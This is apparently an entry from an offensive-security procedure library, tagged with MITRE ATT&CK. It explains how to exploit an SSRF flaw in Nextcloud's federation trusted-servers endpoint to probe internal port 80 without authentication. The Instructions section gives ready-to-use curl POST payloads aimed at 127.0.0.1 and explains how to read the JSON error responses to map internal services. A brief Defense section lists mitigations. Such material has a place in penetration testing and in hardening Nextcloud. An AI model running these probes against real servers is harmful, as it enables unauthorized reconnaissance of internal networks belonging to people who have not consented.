---
id: proc-ssrf-probe-port-80
tags:
  - ssrf
  - port-scanning
  - localhost
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/ssrf-probe-port-80]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T04:08:48.724Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques:
  - '[[Vulnerability Scanning]]'
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Probe-Localhost-Port-80-via-SSRF

## Summary

This procedure exploits the SSRF in Nextcloud's trusted-servers endpoint to probe localhost port 80, observing HTTP responses to determine if the port is open and services are accessible internally.

## Description

By supplying http://127.0.0.1:80 as the URL parameter, the server attempts a cURL connection to localhost:80/status.php. A 404 response indicates the port is open (connection succeeded but file not found), allowing attackers to map internal services without direct access. This is part of broader network reconnaissance.

## Requirements

1. Valid Nextcloud instance with vulnerable federation endpoint
2. cURL or equivalent HTTP client for sending POST requests
3. No authentication needed

## Defense

Defensive measures and detection strategies:

- Validate and sanitize URL parameters to block internal IPs (127.0.0.1, 10.0.0.0/8, etc.)
- Disable federation feature or restrict to authenticated users
- Log and alert on cURL errors involving localhost or internal hosts

## Objectives

1. Detect open ports via successful HTTP responses
2. Gather information on internal web services
3. Differentiate from closed port behaviors

## Instructions

### Step 1: Send SSRF Payload for Port 80

**Context**: Craft a POST request targeting localhost port 80 to trigger the server-side cURL.

**Command** ([[commands/ssrf-probe-port-80]]):
```bash
curl -X POST -d "url=http://127.0.0.1:80" https://target-nextcloud/index.php/apps/federation/trusted-servers
```

> The command sends the internal URL, prompting the server to connect to port 80. Success is indicated by a response showing a 404 on /status.php, confirming the port is open.

### Step 2: Interpret Response for Port Status

**Context**: Analyze the JSON error message to validate the probe.

**Command** ([[commands/ssrf-probe-port-80]]):
```bash
curl -X POST -d "url=http://127.0.0.1:80" https://target-nextcloud/index.php/apps/federation/trusted-servers | jq .
```

> Expected output: {"message":"Client error response [url] http://127.0.0.1/status.php [status code] 404 [reason phrase] Not Found"}, verifying connection success.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques

- [[Vulnerability Scanning]]

## Commands Used

- [[commands/ssrf-probe-port-80]]

## Tools Used

- [[tools/curl]]

## Tags

- ssrf
- port-probe
- open-port
